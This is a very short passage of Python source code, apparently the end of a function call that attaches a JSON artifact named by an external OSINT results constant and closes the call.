        artifacts=[_json_artifact(EXTERNAL_OSINT_RESULTS_ARTIFACT_NAME, artifact_payload)],
    )
